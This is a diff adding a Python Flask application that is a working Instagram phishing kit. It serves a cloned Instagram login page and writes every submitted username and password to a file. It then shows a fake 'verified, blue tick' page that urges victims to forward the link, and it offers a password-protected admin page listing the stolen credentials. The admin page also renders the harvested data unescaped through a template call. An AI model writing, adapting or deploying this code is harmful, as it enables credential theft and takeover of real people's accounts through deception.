@@ -1,0 +1,138 @@
+from flask import Flask, render_template_string, request, redirect, url_for
+
+app = Flask(__name__)
+
+# Admin password (change this to your secret admin password)
+ADMIN_PASSWORD = "@sidhanta7847060416"
+
+# HTML template for the login page
+login_page = '''
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram Login</title>
+</head>
+<body style="background-color: #fafafa; font-family: Arial, sans-serif; text-align: center; margin-top: 100px;">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" width="100">
+    <h1 style="font-family: 'Billabong', cursive; font-size: 50px;">Instagram</h1>
+    <form method="POST" style="margin-top: 20px;">
+        <input type="text" name="username" placeholder="Phone number, username, or email" style="width: 250px; height: 30px; margin: 5px; border-radius: 5px; border: 1px solid #ccc;"><br>
+        <input type="password" name="password" placeholder="Password" style="width: 250px; height: 30px; margin: 5px; border-radius: 5px; border: 1px solid #ccc;"><br>
+        <input type="submit" value="Log In" style="width: 260px; height: 35px; margin-top: 10px; background-color: #3897f0; color: white; border: none; border-radius: 5px;">
+    </form>
+</body>
+</html>
+'''
+
+# HTML template for the success page (after login)
+success_page = '''
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verification Successful</title>
+    <meta http-equiv="refresh" content="5;url=/home" />
+</head>
+<body style="background-color: #fafafa; font-family: Arial, sans-serif; text-align: center; margin-top: 100px;">
+    <h1>Congratulations 🎉</h1>
+    <p>Your account has been verified! Now you can get a <b>blue tick</b>.</p>
+    <p>Send this to other users who were using Instagram before 2024 to save them from hacking and get verified!</p>
+    <p><small>You will be redirected to your Instagram feed in 5 seconds...</small></p>
+</body>
+</html>
+'''
+
+# HTML template for the fake Instagram home page
+home_page = '''
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram Home</title>
+</head>
+<body style="background-color: #fafafa; font-family: Arial, sans-serif; text-align: center;">
+    <h1 style="font-family: 'Billabong', cursive; font-size: 50px;">Instagram</h1>
+    <div style="margin-top: 30px;">
+        <h2>Welcome to your feed!</h2>
+        <div style="background-color: white; width: 300px; margin: 20px auto; padding: 10px; border: 1px solid #ddd; border-radius: 10px;">
+            <p><b>@friend1</b></p>
+            <img src="https://via.placeholder.com/250" width="250"><br>
+            <p>Enjoying a sunny day! ☀️</p>
+        </div>
+        <div style="background-color: white; width: 300px; margin: 20px auto; padding: 10px; border: 1px solid #ddd; border-radius: 10px;">
+            <p><b>@friend2</b></p>
+            <img src="https://via.placeholder.com/250" width="250"><br>
+            <p>New artwork completed! 🎨</p>
+        </div>
+    </div>
+</body>
+</html>
+'''
+
+# HTML template for admin login
+admin_login_page = '''
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Admin Login</title>
+</head>
+<body style="background-color: #fafafa; font-family: Arial, sans-serif; text-align: center; margin-top: 100px;">
+    <h2>Admin Panel Login</h2>
+    <form method="POST">
+        <input type="password" name="admin_password" placeholder="Enter Admin Password" style="width: 250px; height: 30px; margin: 5px;"><br>
+        <input type="submit" value="Enter" style="width: 260px; height: 35px; margin-top: 10px; background-color: #3897f0; color: white; border: none; border-radius: 5px;">
+    </form>
+</body>
+</html>
+'''
+
+# HTML template for admin user data page
+admin_data_page = '''
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Collected User Info</title>
+</head>
+<body style="background-color: #fafafa; font-family: Arial, sans-serif; text-align: center;">
+    <h2>Collected User Information</h2>
+    <div style="margin-top: 30px;">
+        {user_data}
+    </div>
+</body>
+</html>
+'''
+
+# List to save users
+users = []
+
+@app.route('/', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        username = request.form['username']
+        password = request.form['password']
+        users.append({'username': username, 'password': password})
+        with open('users.txt', 'a') as f:
+            f.write(f"{username},{password}\n")
+        return render_template_string(success_page)
+    return render_template_string(login_page)
+
+@app.route('/home')
+def home():
+    return render_template_string(home_page)
+
+@app.route('/admin', methods=['GET', 'POST'])
+def admin():
+    if request.method == 'POST':
+        admin_pass = request.form['admin_password']
+        if admin_pass == ADMIN_PASSWORD:
+            try:
+                with open('users.txt', 'r') as f:
+                    data = f.readlines()
+                user_data = '<br>'.join(data)
+                return render_template_string(admin_data_page.format(user_data=user_data.replace(",", " : ")))
+            except FileNotFoundError:
+                return "No user data found!"
+        else:
+            return "Access Denied! Wrong Admin Password."
+    return render_template_string(admin_login_page)
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8080)
